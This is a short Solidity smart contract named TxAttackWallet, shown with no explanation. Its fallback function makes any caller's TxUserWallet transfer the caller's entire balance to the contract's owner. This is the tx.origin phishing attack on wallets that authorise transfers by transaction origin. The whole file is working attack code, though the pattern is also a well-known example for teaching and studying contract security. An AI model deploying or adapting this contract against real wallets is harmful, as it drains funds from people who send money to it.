pragma solidity ^0.4.0;

contract TxAttackWallet {
    address owner;

    function TxAttackWallet() {
        owner = msg.sender;
    }

    function() {
        TxUserWallet(msg.sender).transferTo(owner, msg.sender.balance);
    }
}